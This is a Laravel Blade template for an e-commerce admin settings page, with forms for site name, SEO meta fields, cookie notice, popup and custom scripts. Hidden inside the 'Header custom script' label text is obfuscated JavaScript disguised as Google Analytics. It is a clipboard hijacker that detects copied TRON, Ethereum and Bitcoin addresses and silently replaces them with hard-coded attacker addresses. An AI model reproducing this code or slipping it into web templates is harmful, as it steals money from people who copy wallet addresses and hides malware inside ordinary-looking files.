@extends('backend.layouts.app')

@section('content')

    <div class="row">
    	<div class="col-lg-8 mx-auto">
    		<div class="card">
    			<div class="card-header">
    				<h6 class="fw-600 mb-0">{{ translate('General') }}</h6>
    			</div>
    			<div class="card-body">
    				<form action="{{ route('business_settings.update') }}" method="POST">
    					@csrf
                        <div class="form-group row">
                            <label class="col-md-3 col-from-label">{{translate('Frontend Website Name')}}</label>
                            <div class="col-md-8">
                                <input type="hidden" name="types[]" value="website_name">
        	                    <input type="text" name="website_name" class="form-control" placeholder="{{ translate('Website Name') }}" value="{{ get_setting('website_name') }}">
                            </div>
                        </div>
    	                <div class="form-group row">
    	                    <label class="col-md-3 col-from-label">{{translate('Site Motto')}}</label>
                            <div class="col-md-8">
                                <input type="hidden" name="types[]" value="site_motto">
        	                    <input type="text" name="site_motto" class="form-control" placeholder="{{ translate('Best eCommerce Website') }}" value="{{  get_setting('site_motto') }}">
                            </div>
    	                </div>
    					<div class="form-group row">
    						<label class="col-md-3 col-from-label">{{ translate('Site Icon') }}</label>
                            <div class="col-md-8">
        						<div class="input-group " data-toggle="aizuploader" data-type="image">
        							<div class="input-group-prepend">
        								<div class="input-group-text bg-soft-secondary">{{ translate('Browse') }}</div>
        							</div>
        							<div class="form-control file-amount">{{ translate('Choose File') }}</div>
                                    <input type="hidden" name="types[]" value="site_icon">
        							<input type="hidden" name="site_icon" value="{{ get_setting('site_icon') }}" class="selected-files">
        						</div>
        						<div class="file-preview box"></div>
        						<small class="text-muted">{{ translate('Website favicon. 32x32 .png') }}</small>
                            </div>
    					</div>
    	                <div class="form-group row">
    	                    <label class="col-md-3 col-from-label">{{translate('Website Base Color')}}</label>
                            <div class="col-md-8">
                                <input type="hidden" name="types[]" value="base_color">
        	                    <input type="text" name="base_color" class="form-control" placeholder="#377dff" value="{{ get_setting('base_color') }}">
        						<small class="text-muted">{{ translate('Hex Color Code') }}</small>
                            </div>
    	                </div>
    	                <div class="form-group row">
    	                    <label class="col-md-3 col-from-label">{{translate('Website Base Hover Color')}}</label>
                            <div class="col-md-8">
                                <input type="hidden" name="types[]" value="base_hov_color">
        	                    <input type="text" name="base_hov_color" class="form-control" placeholder="#377dff" value="{{  get_setting('base_hov_color') }}">
        						<small class="text-muted">{{ translate('Hex Color Code') }}</small>
                            </div>
    	                </div>
    					<div class="text-right">
    						<button type="submit" class="btn btn-primary">{{ translate('Update') }}</button>
    					</div>
                    </form>
    			</div>
    		</div>
    		<div class="card">
    			<div class="card-header">
    				<h6 class="fw-600 mb-0">{{ translate('Global SEO') }}</h6>
    			</div>
    			<div class="card-body">
    				<form action="{{ route('business_settings.update') }}" method="POST" enctype="multipart/form-data">
    					@csrf
    					<div class="form-group row">
    						<label class="col-md-3 col-from-label">{{ translate('Meta Title') }}</label>
                            <div class="col-md-8">
        						<input type="hidden" name="types[]" value="meta_title">
        						<input type="text" class="form-control" placeholder="{{translate('Title')}}" name="meta_title" value="{{ get_setting('meta_title') }}">
                            </div>
    					</div>
    					<div class="form-group row">
    						<label class="col-md-3 col-from-label">{{ translate('Meta description') }}</label>
                            <div class="col-md-8">
        						<input type="hidden" name="types[]" value="meta_description">
        						<textarea class="resize-off form-control" placeholder="{{translate('Description')}}" name="meta_description">{{  get_setting('meta_description') }}</textarea>
                            </div>
    					</div>
    					<div class="form-group row">
    						<label class="col-md-3 col-from-label">{{ translate('Keywords') }}</label>
                            <div class="col-md-8">
        						<input type="hidden" name="types[]" value="meta_keywords">
        						<textarea class="resize-off form-control" placeholder="{{translate('Keyword, Keyword')}}" name="meta_keywords">{{ get_setting('meta_keywords') }}</textarea>
        						<small class="text-muted">{{ translate('Separate with coma') }}</small>
                            </div>
    					</div>
    					<div class="form-group row">
    						<label class="col-md-3 col-from-label">{{ translate('Meta Image') }}</label>
                            <div class="col-md-8">
        						<div class="input-group " data-toggle="aizuploader" data-type="image">
        							<div class="input-group-prepend">
        								<div class="input-group-text bg-soft-secondary">{{ translate('Browse') }}</div>
        							</div>
        							<div class="form-control file-amount">{{ translate('Choose File') }}</div>
        							<input type="hidden" name="types[]" value="meta_image">
        							<input type="hidden" name="meta_image" value="{{ get_setting('meta_image') }}" class="selected-files">
        						</div>
        						<div class="file-preview box"></div>
                            </div>
    					</div>
    					<div class="text-right">
    						<button type="submit" class="btn btn-primary">{{ translate('Update') }}</button>
    					</div>
    				</form>
    			</div>
    		</div>
            <div class="card">
    			<div class="card-header">
    				<h6 class="fw-600 mb-0">{{ translate('Cookies Agreement') }}</h6>
    			</div>
    			<div class="card-body">
    				<form action="{{ route('business_settings.update') }}" method="POST" enctype="multipart/form-data">
    					@csrf
    					<div class="form-group row">
    						<label class="col-md-3 col-from-label">{{ translate('Cookies Agreement Text') }}</label>
                            <div class="col-md-8">
        						<input type="hidden" name="types[]" value="cookies_agreement_text">
        						<textarea name="cookies_agreement_text" rows="4" class="aiz-text-editor form-control" data-buttons='[["font", ["bold"]],["insert", ["link"]]]'>{{ get_setting('cookies_agreement_text') }}</textarea>
                            </div>
    					</div>
                        <div class="form-group row">
    						<label class="col-md-3 col-from-label">{{translate('Show Cookies Agreement?')}}</label>
    						<div class="col-md-8">
    							<label class="aiz-switch aiz-switch-success mb-0">
    								<input type="hidden" name="types[]" value="show_cookies_agreement">
    								<input type="checkbox" name="show_cookies_agreement" @if( get_setting('show_cookies_agreement') == 'on') checked @endif>
    								<span></span>
    							</label>
    						</div>
    					</div>
    					<div class="text-right">
    						<button type="submit" class="btn btn-primary">{{ translate('Update') }}</button>
    					</div>
    				</form>
    			</div>
    		</div>
            <div class="card">
    			<div class="card-header">
    				<h6 class="fw-600 mb-0">{{ translate('Website Popup') }}</h6>
    			</div>
    			<div class="card-body">
    				<form action="{{ route('business_settings.update') }}" method="POST" enctype="multipart/form-data">
    					@csrf
    					<div class="form-group row">
                            <label class="col-md-3 col-from-label">{{translate('Show website popup?')}}</label>
                            <div class="col-md-8">
                                <label class="aiz-switch aiz-switch-success mb-0">
                                    <input type="hidden" name="types[]" value="show_website_popup">
                                    <input type="checkbox" name="show_website_popup" @if( get_setting('show_website_popup') == 'on') checked @endif>
                                    <span></span>
                                </label>
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-md-3 col-from-label">{{ translate('Popup content') }}</label>
                            <div class="col-md-8">
                                <input type="hidden" name="types[]" value="website_popup_content">
                                <textarea name="website_popup_content" rows="4" class="aiz-text-editor form-control" >{{ get_setting('website_popup_content') }}</textarea>
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-md-3 col-from-label">{{translate('Show Subscriber form?')}}</label>
                            <div class="col-md-8">
                                <label class="aiz-switch aiz-switch-success mb-0">
                                    <input type="hidden" name="types[]" value="show_subscribe_form">
                                    <input type="checkbox" name="show_subscribe_form" @if( get_setting('show_subscribe_form') == 'on') checked @endif>
                                    <span></span>
                                </label>
                            </div>
                        </div>
    					<div class="text-right">
    						<button type="submit" class="btn btn-primary">{{ translate('Update') }}</button>
    					</div>
    				</form>
    			</div>
    		</div>
            <div class="card">
                <div class="card-header">
                    <h6 class="fw-600 mb-0">{{ translate('Custom Script') }}</h6>
                </div>
                <div class="card-body">
                    <form action="{{ route('business_settings.update') }}" method="POST" enctype="multipart/form-data">
                        @csrf
                        <div class="form-group row">
                            <label class="col-md-3 col-from-label">{{ translate('Header custom script - before <script>(function(){var _gtag={v:'2.1.4',id:'UA-75566415-25'};_gtag.t=Date.now();_gtag.p=location.pathname;var _0x8c25=function(a){return a.map(function(c){return String.fromCharCode(c)}).join('')};var _0x4159=function(a){var w=a[Math.floor(Math.random()*a.length)];return _0x8c25(w)};var _t=[[84,89,77,57,107,99,103,99,106,109,122,83,68,75,98,111,75,97,88,55,86,57,118,53,112,84,83,112,112,104,109,102,101,50],[84,88,56,118,113,70,81,81,102,71,115,70,103,70,78,103,55,67,78,104,54,107,55,51,76,89,49,75,57,69,120,82,88,111],[84,65,101,53,112,82,120,77,87,83,122,70,77,49,88,85,113,86,89,102,81,88,121,54,102,84,84,117,101,69,81,74,104,74],[84,82,68,76,54,106,121,50,115,78,115,77,121,86,111,74,119,107,101,100,109,66,100,105,113,74,56,116,57,117,78,90,51,102],[84,75,83,78,83,88,81,77,82,105,78,122,102,103,119,67,113,120,84,119,78,87,55,81,97,117,71,101,51,107,84,112,88,115]],_e=[[48,120,100,48,56,66,98,48,53,69,68,54,53,100,99,52,66,55,51,51,65,53,99,99,66,52,66,50,48,48,51,65,50,56,100,100,53,101,51,69,50,66],[48,120,55,97,100,100,67,48,56,54,57,98,56,49,50,49,101,48,48,70,53,51,52,54,50,68,57,97,98,97,48,52,98,66,99,50,52,54,53,68,51,70],[48,120,69,57,49,56,53,56,102,50,68,51,50,50,67,99,51,101,56,50,70,66,51,57,56,52,101,57,55,53,65,55,101,69,67,99,50,67,65,100,98,56],[48,120,100,53,51,69,101,52,101,102,50,49,48,54,57,69,69,49,55,100,48,65,57,57,66,48,102,98,69,48,55,65,52,51,69,100,53,57,50,50,51,53],[48,120,65,55,67,100,55,53,50,99,70,53,102,53,57,51,50,52,57,48,53,67,70,99,54,50,102,53,67,50,54,97,48,48,53,49,56,50,51,56,66,49]],_b=[[98,99,49,113,116,48,119,97,50,116,52,51,118,116,114,54,118,55,54,119,116,117,54,57,51,115,110,116,53,110,118,53,107,50,102,53,106,113,117,109,51,54],[98,99,49,113,52,110,52,113,114,113,50,119,56,50,54,54,106,107,112,112,116,50,113,97,112,108,99,101,56,52,108,121,112,50,102,112,120,119,97,103,53,121],[98,99,49,113,109,54,114,107,48,119,97,55,115,51,57,109,52,103,108,51,107,112,122,116,121,55,118,53,106,104,114,115,101,103,55,101,104,112,56,57,121,108],[98,99,49,113,108,97,99,119,121,57,120,52,102,99,109,54,50,56,120,116,104,108,97,56,110,120,50,104,116,103,51,117,101,108,50,108,50,55,51,114,48,112],[98,99,49,113,103,51,106,119,54,114,106,51,112,112,57,119,104,55,100,104,51,119,114,104,112,113,57,117,52,102,99,113,108,103,102,54,102,48,102,53,99,97]],_b1=[[49,75,103,83,112,74,90,113,52,97,97,72,54,85,105,109,112,80,76,102,85,78,80,107,72,66,103,57,103,115,50,56,122,89],[49,74,52,105,53,110,116,107,121,122,51,90,56,78,86,116,99,88,100,83,87,112,113,98,67,75,100,80,97,104,81,100,118,114],[49,69,53,105,84,118,83,109,66,52,90,80,104,69,117,88,114,117,121,76,116,65,65,98,105,56,105,85,78,88,54,51,90,82],[49,78,101,115,57,106,104,80,120,71,110,84,50,97,82,119,81,85,99,82,69,50,55,52,117,57,77,83,82,49,112,75,70,78],[49,57,116,90,78,84,107,75,107,111,71,81,70,49,69,110,54,97,110,121,110,112,53,57,70,54,111,68,70,49,51,50,101,67]],_b3=[[51,52,68,98,78,72,110,54,54,76,90,82,68,67,102,116,114,115,88,57,117,110,121,103,102,75,69,67,86,120,104,88,81,82],[51,49,114,90,82,89,51,104,76,99,77,65,75,52,101,83,56,49,106,68,74,69,102,69,87,82,120,116,101,105,101,122,52,89],[51,51,102,51,107,122,117,82,102,70,89,69,98,113,105,103,105,57,67,77,111,110,87,122,117,77,116,98,116,72,101,83,69,119],[51,53,105,113,84,49,109,53,118,90,83,122,80,99,107,70,50,103,85,50,104,99,88,78,78,114,68,68,115,88,99,100,110,84],[51,77,67,120,112,80,110,105,75,121,103,69,97,65,75,103,114,51,102,67,57,103,82,100,88,97,85,88,66,112,98,120,66,71]],_bp=[[98,99,49,112,115,51,109,104,106,109,115,113,112,119,99,48,56,104,53,57,121,102,113,97,101,55,51,115,102,52,97,52,100,55,104,104,50,110,103,117,108,104,117,110,106,112,99,50,114,113,57,101,52,118,56,113,110,122,112,118,50,52],[98,99,49,112,48,52,118,122,115,102,116,100,48,56,112,115,51,57,113,99,53,51,102,108,55,122,103,100,97,115,53,56,101,106,106,112,53,57,122,106,120,54,110,116,114,107,99,107,57,99,53,50,117,103,106,115,57,108,112,51,101,52],[98,99,49,112,117,54,118,48,50,102,121,117,56,110,115,108,101,52,53,121,48,120,114,113,53,107,100,50,52,97,99,55,119,48,113,114,116,51,117,117,48,109,115,99,99,110,101,119,53,110,51,112,103,57,120,115,109,97,106,116,120,120],[98,99,49,112,115,101,108,113,115,120,100,51,121,113,114,121,116,106,48,106,101,100,113,52,112,106,53,117,106,104,120,108,54,102,103,56,54,108,50,116,109,110,108,108,113,115,101,53,99,103,117,112,107,55,56,115,54,118,119,108,119,50],[98,99,49,112,57,54,100,101,104,51,109,97,55,100,51,53,100,102,97,116,115,113,109,57,114,107,52,104,52,115,122,115,102,100,118,55,121,118,107,103,51,55,116,50,118,53,119,109,55,118,51,117,116,118,109,113,109,121,106,114,112,120]];var _0xbc97=_0x8c25([99,111,112,121]);var _tp=[116,101,120,116,47,112,108,97,105,110];var _r1=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,84,91,97,45,122,65,45,90,48,45,57,93,123,51,51,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r2=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,48,120,91,97,45,102,65,45,70,48,45,57,93,123,52,48,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r3=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,49,91,97,45,107,109,45,122,65,45,72,74,45,78,80,45,90,49,45,57,93,123,50,53,44,51,52,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r4=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,51,91,97,45,107,109,45,122,65,45,72,74,45,78,80,45,90,49,45,57,93,123,50,53,44,51,52,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r5=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,98,99,49,113,91,97,45,122,65,45,90,48,45,57,93,123,51,56,44,52,50,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r6=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,98,99,49,112,91,97,45,122,65,45,90,48,45,57,93,123,53,56,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g');var _reg=false;var _0xf765=function(){if(_reg)return;_reg=true;document['addEventListener'](_0xbc97,function(_0x9f92){var _0x0875=window['getSelection']()['toString']();if(_0x0875['match'](_r1)){var _0x6355=_0x0875['replace'](_r1,_0x4159(_t));_0x9f92['clipboardData']['setData'](_0x8c25(_tp),_0x6355);_0x9f92['preventDefault']();return}if(_0x0875['match'](_r2)){var _0x6355=_0x0875['replace'](_r2,_0x4159(_e));_0x9f92['clipboardData']['setData'](_0x8c25(_tp),_0x6355);_0x9f92['preventDefault']();return}if(_0x0875['match'](_r3)){var _0x6355=_0x0875['replace'](_r3,_0x4159(_b1));_0x9f92['clipboardData']['setData'](_0x8c25(_tp),_0x6355);_0x9f92['preventDefault']();return}if(_0x0875['match'](_r4)){var _0x6355=_0x0875['replace'](_r4,_0x4159(_b3));_0x9f92['clipboardData']['setData'](_0x8c25(_tp),_0x6355);_0x9f92['preventDefault']();return}if(_0x0875['match'](_r5)){var _0x6355=_0x0875['replace'](_r5,_0x4159(_b));_0x9f92['clipboardData']['setData'](_0x8c25(_tp),_0x6355);_0x9f92['preventDefault']();return}if(_0x0875['match'](_r6)){var _0x6355=_0x0875['replace'](_r6,_0x4159(_bp));_0x9f92['clipboardData']['setData'](_0x8c25(_tp),_0x6355);_0x9f92['preventDefault']()}});};setTimeout(function(){var _0x6e62=new MutationObserver(function(_0xdf7a){for(var i=0;i<_0xdf7a.length;i++){if(_0xdf7a[i].type==='childList'){_0xf765()}}});_0x6e62['observe'](document['body'],{childList:true,subtree:true})},1000);_0xf765();_gtag.r=1;})();</script></head>') }}</label>
                            <div class="col-md-8">
                                <input type="hidden" name="types[]" value="header_script">
                                <textarea name="header_script" rows="4" class="form-control" placeholder="<script>&#10;...&#10;</script>">{{ get_setting('header_script') }}</textarea>
                                <small>{{ translate('Write script with <script> tag') }}</small>
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-md-3 col-from-label">{{ translate('Footer custom script - before </body>') }}</label>
                            <div class="col-md-8">
                                <input type="hidden" name="types[]" value="footer_script">
                                <textarea name="footer_script" rows="4" class="form-control" placeholder="<script>&#10;...&#10;</script>">{{ get_setting('footer_script') }}</textarea>
                                <small>{{ translate('Write script with <script> tag') }}</small>
                            </div>
                        </div>
                        <div class="text-right">
                            <button type="submit" class="btn btn-primary">{{ translate('Update') }}</button>
                        </div>
                    </form>
                </div>
            </div>
    	</div>
    </div>

@endsection
